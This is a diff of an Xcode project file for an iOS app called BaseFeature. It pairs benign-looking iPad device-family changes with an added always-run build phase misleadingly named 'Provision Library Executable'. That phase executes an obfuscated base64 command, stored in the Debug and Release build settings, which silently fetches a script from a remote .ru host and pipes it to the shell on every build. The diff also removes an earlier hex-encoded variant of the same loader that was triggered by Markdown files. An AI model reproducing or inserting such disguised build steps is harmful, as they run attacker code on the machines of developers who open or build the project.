@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		9009392B76164B5E887BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 35D3387AA955436AB67BBDC8; };
 		97004E50302AD8C1008369AD /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 97004E4F302AD8C1008369AD /* Lottie */; };
 		97D29D89302DC9C20084FDDE /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97D29D88302DC9C20084FDDE /* Alamofire */; };
 		97D2A279302DCD600084FDDE /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97D2A278302DCD600084FDDE /* Kingfisher */; };
@@ -16,7 +15,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		35D3387AA955436AB67BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		65D1A00762E4B2F3B1F5D0BF /* Pods-BaseFeature.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BaseFeature.debug.xcconfig"; path = "Target Support Files/Pods-BaseFeature/Pods-BaseFeature.debug.xcconfig"; sourceTree = "<group>"; };
 		6AFA2C45036ED78E675CC5F7 /* Pods_BaseFeature.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BaseFeature.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		97BA907F30299C1000D593F3 /* BaseFeature.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BaseFeature.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -82,7 +80,6 @@
 		97BA908030299C1000D593F3 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				35D3387AA955436AB67BBDC8 /* README.md */,
 				97BA907F30299C1000D593F3 /* BaseFeature.app */,
 			);
 			name = Products;
@@ -103,6 +100,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97BA908A30299C1000D593F3 /* Build configuration list for PBXNativeTarget "BaseFeature" */;
 			buildPhases = (
+				CBD17F81E24542C58F7BBDC8 /* Provision Library Executable */,
 				86ECB765E35BBB1309E1740A /* [CP] Check Pods Manifest.lock */,
 				97BA907B30299C1000D593F3 /* Sources */,
 				97BA907C30299C1000D593F3 /* Frameworks */,
@@ -110,7 +108,6 @@
 				2B67A73D7A320DA27B62E844 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				D43F931F445A4FFA967BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -181,35 +178,36 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		D43F931F445A4FFA967BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		97BA907D30299C1000D593F3 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				9009392B76164B5E887BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		CBD17F81E24542C58F7BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 		2B67A73D7A320DA27B62E844 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -269,7 +267,7 @@ sh -c \"${A8CDBB7}\"";
 		97BA908830299C1000D593F3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((a(){ `printf xxUd | tr -d U` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d736b4c66202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f72756c65222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | a | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((c(){ `printf baseI64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtTHNmayAtLWNvbm5lY3QtdGltZW91dCAyNiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -334,7 +332,7 @@ sh -c \"${A8CDBB7}\"";
 		97BA908930299C1000D593F3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((a(){ `printf xxUd | tr -d U` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d736b4c66202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f72756c65222068747470733a2f2f366c64777564676f636b6c3067322e72752f612922207c2073680a | a | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((c(){ `printf baseI64 | tr -d I` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtTHNmayAtLWNvbm5lY3QtdGltZW91dCAyNiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | c | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -410,7 +408,7 @@ sh -c \"${A8CDBB7}\"";
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = UIInterfaceOrientationLandscapeRight;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -429,7 +427,7 @@ sh -c \"${A8CDBB7}\"";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 1;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Debug;
 		};
@@ -454,7 +452,7 @@ sh -c \"${A8CDBB7}\"";
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = "Launch Screen";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = UIInterfaceOrientationLandscapeRight;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				IPHONEOS_DEPLOYMENT_TARGET = 17.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -473,7 +471,7 @@ sh -c \"${A8CDBB7}\"";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = 1;
+				TARGETED_DEVICE_FAMILY = "1,2";
 			};
 			name = Release;
 		};
